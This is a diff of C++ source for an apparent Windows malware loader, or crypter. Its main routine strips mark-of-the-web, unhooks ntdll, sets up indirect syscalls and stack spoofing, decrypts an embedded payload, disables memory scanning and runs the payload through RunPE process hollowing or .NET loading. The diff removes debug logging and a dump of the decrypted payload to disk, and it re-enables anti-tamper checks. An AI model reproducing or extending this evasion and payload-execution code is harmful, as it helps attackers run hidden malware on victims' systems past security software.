@@ -220,68 +220,10 @@ __declspec(allocate(".xthrx")) GadgetBlock GadgetData = {
 
 
 // ═══════════════════════════════════════════════════════════════
-//  IAT-based file debug log — no CRC32C dependency, always works
-// ═══════════════════════════════════════════════════════════════
-namespace DbgLog {
-    extern "C" __declspec(dllimport) void __stdcall OutputDebugStringA(const char*);
-    extern "C" __declspec(dllimport) HANDLE __stdcall CreateFileA(const char*,DWORD,DWORD,void*,DWORD,DWORD,HANDLE);
-    extern "C" __declspec(dllimport) BOOL __stdcall WriteFile(HANDLE,const void*,DWORD,DWORD*,void*);
-    extern "C" __declspec(dllimport) BOOL __stdcall CloseHandle(HANDLE);
-    extern "C" __declspec(dllimport) LONG __stdcall SetFilePointer(HANDLE,LONG,LONG*,DWORD);
-
-    static const char* LOG_PATH = "C:\\temp\\xen_debug.log";
-
-    __forceinline void Log(const char* msg) {
-        OutputDebugStringA(msg);
-        HANDLE h = CreateFileA(LOG_PATH, 0x40000000, 0x01, NULL, 4, 0x80, NULL);
-        if (h == (HANDLE)(LONG_PTR)-1) return;
-        SetFilePointer(h, 0, NULL, 2);
-        DWORD len = 0; while (msg[len]) len++;
-        DWORD wr = 0;
-        WriteFile(h, msg, len, &wr, NULL);
-        WriteFile(h, "\r\n", 2, &wr, NULL);
-        CloseHandle(h);
-    }
-
-    __forceinline void LogHex(const char* prefix, unsigned long val) {
-        char buf[128]; int p = 0;
-        while (prefix[p] && p < 80) { buf[p] = prefix[p]; p++; }
-        buf[p++] = '0'; buf[p++] = 'x';
-        const char* hx = "0123456789ABCDEF";
-        buf[p++] = hx[(val>>28)&0xF]; buf[p++] = hx[(val>>24)&0xF];
-        buf[p++] = hx[(val>>20)&0xF]; buf[p++] = hx[(val>>16)&0xF];
-        buf[p++] = hx[(val>>12)&0xF]; buf[p++] = hx[(val>>8)&0xF];
-        buf[p++] = hx[(val>>4)&0xF];  buf[p++] = hx[val&0xF];
-        buf[p] = 0;
-        Log(buf);
-    }
-
-    __forceinline void LogBytes(const char* prefix, const unsigned char* data, int cnt) {
-        char buf[256]; int p = 0;
-        while (prefix[p] && p < 60) { buf[p] = prefix[p]; p++; }
-        buf[p++] = ' ';
-        const char* hx = "0123456789ABCDEF";
-        for (int i = 0; i < cnt && p < 240; i++) {
-            buf[p++] = hx[(data[i]>>4)&0xF]; buf[p++] = hx[data[i]&0xF]; buf[p++] = ' ';
-        }
-        buf[p] = 0;
-        Log(buf);
-    }
-
-    __forceinline void DumpFile(const char* path, const unsigned char* data, DWORD size) {
-        HANDLE h = CreateFileA(path, 0x40000000, 0, NULL, 2, 0x80, NULL);
-        if (h == (HANDLE)(LONG_PTR)-1) return;
-        DWORD wr = 0; WriteFile(h, data, size, &wr, NULL); CloseHandle(h);
-    }
-}
-
-// ═══════════════════════════════════════════════════════════════
 //  MAIN ENTRY — No UAC manifest, runs as standard user
 // ═══════════════════════════════════════════════════════════════
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    DbgLog::Log("=== WinMain entry ===");
-
     // ── Step -2: MOTW Strip (L21) ──
     if (GlobalConfig.bMotwStrip) {
         if (Motw::StripAndRelaunch()) {
@@ -296,31 +238,25 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 0: Anti-Tamper (Always Active) ──
-    // TEMPORARILY DISABLED for E2E debugging
-    DbgLog::Log("Step0: VerifyIntegrity SKIPPED (E2E debug)");
+    if (!Protection::VerifyIntegrity()) {
+        return 0;
+    }
+    Protection::JunkCode();
 
     // ── Step 0c: Initialize CRC32C detection ──
     Crc32C::DetectSse42();
-    DbgLog::Log("Step0c: Crc32C::DetectSse42 done");
 
     // ── Step 1: Unhook ntdll ──
     if (GlobalConfig.bKnownDllsUnhook) {
-        DbgLog::Log("Step1: KnownDlls::UnhookNtdll starting");
         KnownDlls::UnhookNtdll();
     } else {
-        DbgLog::Log("Step1: Unhook::RefreshNtdll starting");
         Unhook::RefreshNtdll();
     }
-    DbgLog::Log("Step1: unhook done");
 
     // ── Step 1b: Scan for indirect syscall gadgets ──
     if (GlobalConfig.bIndirectSyscalls) {
-        DbgLog::Log("Step1b: GadgetPool::Scan starting");
         GadgetPool::Scan();
-        DbgLog::LogHex("Step1b: GadgetPool count=", GadgetPool::Count());
-        DbgLog::Log("Step1b: Syscall::Init starting");
-        bool initOk = Syscall::Init();
-        DbgLog::LogHex("Step1b: Syscall::Init result=", initOk ? 1 : 0);
+        Syscall::Init();
     }
 
     // ── Step 1c: Initialize Stack Spoofing ──
@@ -393,15 +329,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 7: Entropy Normalization Decode ──
-    DbgLog::LogHex("Step7: PayloadData.size=", PayloadData.size);
-    DbgLog::LogBytes("Step7: raw payload first 16 bytes:", PayloadData.data, 16);
-
     DWORD decryptSize = PayloadData.size;
 
-    if (PayloadData.size == 0 || PayloadData.size > sizeof(PayloadData.data)) {
-        DbgLog::Log("Step7: payload size invalid, exiting");
+    if (PayloadData.size == 0 || PayloadData.size > sizeof(PayloadData.data))
         return 0;
-    }
 
     if (GlobalConfig.bEntropyNorm && PayloadData.size > 1 && PayloadData.data[0] == 0xEE) {
         decryptSize = PayloadData.size - 1;
@@ -421,9 +352,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
 
     // ── Step 8: Decrypt Payload ──
-    DbgLog::LogHex("Step8: encAlgorithm=", GlobalConfig.encAlgorithm);
-    DbgLog::LogBytes("Step8: key first 16 bytes:", finalKey, 16);
-
     if (GlobalConfig.researchPackage > 0) {
         bool resOk = false;
         switch (GlobalConfig.researchPackage) {
@@ -436,26 +364,18 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
             case 4: resOk = VoidDecrypt::Decrypt(PayloadData.data, decryptSize,
                 finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize); break;
         }
-        if (!resOk) { DbgLog::Log("Step8: research decrypt FAILED"); return 0; }
+        if (!resOk) return 0;
     }
     else {
         Crypto::Algorithm algo = static_cast<Crypto::Algorithm>(GlobalConfig.encAlgorithm);
         if (GlobalConfig.bStagedLoad) {
-            if (!StageLoader::DecryptStaged(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo)) {
-                DbgLog::Log("Step8: staged decrypt FAILED"); return 0;
-            }
+            if (!StageLoader::DecryptStaged(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo))
+                return 0;
         } else {
-            bool decOk = Crypto::Decrypt(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo);
-            if (!decOk) { DbgLog::Log("Step8: Crypto::Decrypt FAILED"); return 0; }
-            DbgLog::Log("Step8: Crypto::Decrypt OK");
+            if (!Crypto::Decrypt(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo))
+                return 0;
         }
     }
-
-    DbgLog::LogBytes("Step8: decrypted first 16 bytes:", PayloadData.data, 16);
-    DbgLog::LogHex("Step8: decrypted first 2 bytes (MZ check)=", PayloadData.data[0] | (PayloadData.data[1] << 8));
-    // Dump decrypted payload to disk for offline PE analysis
-    DbgLog::DumpFile("C:\\temp\\decrypted_payload.exe", PayloadData.data, decryptSize);
-    DbgLog::Log("Step8: dumped decrypted_payload.exe to C:\\temp\\");
 
 
     // ── Step 8b: Anti-Memory Scanning (L14 + L16) ──
@@ -471,9 +391,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 9: Execute Payload ──
-    DbgLog::LogHex("Step9: bRunPE=", GlobalConfig.bRunPE ? 1 : 0);
-    DbgLog::LogHex("Step9: hostProcess=", GlobalConfig.hostProcess);
-
     if (GlobalConfig.bDotNetLoading && DotNetLoader::IsDotNetAssembly(PayloadData.data, decryptSize)) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
@@ -509,9 +426,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     else if (GlobalConfig.bRunPE) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        DbgLog::Log("Step9: calling GodMode::ExecutePayload (RunPE)");
         GodMode::ExecutePayload(PayloadData.data, decryptSize, false, true, GlobalConfig.hostProcess);
-        DbgLog::Log("Step9: GodMode::ExecutePayload returned");
     }
     else if (GlobalConfig.bCallbackDiv) {
         // Layer 2: Callback Diversification — thread из kernel32 callback
